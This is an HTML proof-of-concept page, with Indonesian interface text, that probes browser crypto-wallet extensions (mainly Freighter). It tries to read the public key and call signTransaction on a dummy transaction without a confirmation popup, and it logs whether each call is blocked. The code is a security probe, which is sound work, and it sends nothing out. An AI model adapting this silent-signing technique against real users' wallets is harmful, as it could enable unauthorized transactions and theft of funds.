<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Unauthorized Provider Access PoC</title>
    <style>
        body { font-family: monospace; background: #0b0f19; color: #38bdf8; padding: 20px; }
        .card { background: #1e293b; padding: 20px; border-radius: 8px; border: 1px solid #334155; margin-bottom: 15px; }
        button { background: #7c3aed; color: white; border: none; padding: 12px 15px; border-radius: 6px; cursor: pointer; font-weight: bold; margin: 6px 0; width: 100%; text-align: left; }
        button:hover { background: #6d28d9; }
        .btn-danger { background: #dc2626; }
        .btn-danger:hover { background: #b91c1c; }
        #log { background: #020617; color: #4ade80; padding: 12px; border-radius: 6px; height: 220px; overflow-y: auto; white-space: pre-wrap; border: 1px solid #1e293b; font-size: 0.85rem; }
    </style>
</head>
<body>

    <div class="card">
        <h2>Uji Coba Unauthorized Provider API</h2>
        <p>Menguji apakah fungsi dompet dapat dipanggil tanpa popup konfirmasi.</p>
        
        <button onclick="cekObjekProvider()">1. Cek Ketersediaan Objek Provider</button>
        <button onclick="ujiGetPublicKey()">2. Uji Panggil getPublicKey() Tanpa Interaksi</button>
        <button class="btn-danger" onclick="ujiSignTransaction()">3. Uji Panggil signTransaction() Diam-diam</button>
    </div>

    <div class="card">
        <h3>Live Execution Log:</h3>
        <div id="log">[INFO] Provider test script loaded. Ready.</div>
    </div>

    <script>
        function log(msg) {
            const logBox = document.getElementById('log');
            const time = new Date().toLocaleTimeString();
            logBox.innerText += `\n[${time}] ${msg}`;
            logBox.scrollTop = logBox.scrollHeight;
        }

        // 1. Memeriksa objek global yang disuntikkan dompet
        function cekObjekProvider() {
            log("[PROSES] Memeriksa objek injeksi dompet di window...");
            
            let detected = [];
            if (typeof freighterApi !== 'undefined') detected.push('freighterApi');
            if (typeof window.ethereum !== 'undefined') detected.push('window.ethereum');
            if (typeof window.solana !== 'undefined') detected.push('window.solana');

            if (detected.length > 0) {
                log(`[BERHASIL] Objek dompet ditemukan: ${detected.join(', ')}`);
                // Menampilkan properti yang tersedia di dalam freighterApi jika ada
                if (typeof freighterApi !== 'undefined') {
                    log("[INFO] Fungsi tersedia di freighterApi: " + Object.keys(freighterApi).join(', '));
                }
            } else {
                log("[PERINGATAN] Tidak ada objek provider dompet standar yang terdeteksi di origin ini.");
            }
        }

        // 2. Menguji pengambilan public key secara langsung
        async function ujiGetPublicKey() {
            log("[PROSES] Memanggil fungsi getPublicKey()...");
            try {
                if (typeof freighterApi !== 'undefined' && freighterApi.getPublicKey) {
                    const pubKey = await freighterApi.getPublicKey();
                    log(`[KRITIS!] Berhasil mendapatkan Public Key tanpa popup konfirmasi: ${pubKey}`);
                    alert("Akses Data Sensitif Berhasil: " + pubKey);
                } else {
                    log("[INFO] freighterApi.getPublicKey tidak tersedia atau memerlukan inisialisasi dApp.");
                }
            } catch (err) {
                log(`[TERPROTEKSI] Akses diblokir / memerlukan izin dompet: ${err.message}`);
            }
        }

        // 3. Menguji penandatanganan transaksi secara otomatis
        async function ujiSignTransaction() {
            log("[PROSES] Menguji pemanggilan signTransaction()...");
            try {
                if (typeof freighterApi !== 'undefined' && freighterApi.signTransaction) {
                    // Mengirim dummy payload transaksi untuk uji coba
                    const dummyXdr = "AAAAAgAAAAD...[DUMMY_XDR_PAYLOAD]...";
                    const signed = await freighterApi.signTransaction(dummyXdr);
                    log(`[BAHAYA KRITIS!] Transaksi berhasil ditandatangani tanpa popup interaksi! Hasil: ${signed}`);
                    alert("BERBAHAYA: Auto-signing transaksi berhasil dieksekusi!");
                } else {
                    log("[INFO] Fungsi signTransaction tidak ditemukan atau dibatasi oleh provider.");
                }
            } catch (err) {
                log(`[TERPROTEKSI DENGAN BAIK] Eksekusi tertolak / memunculkan popup konfirmasi: ${err.message}`);
            }
        }
    </script>

</body>
</html>
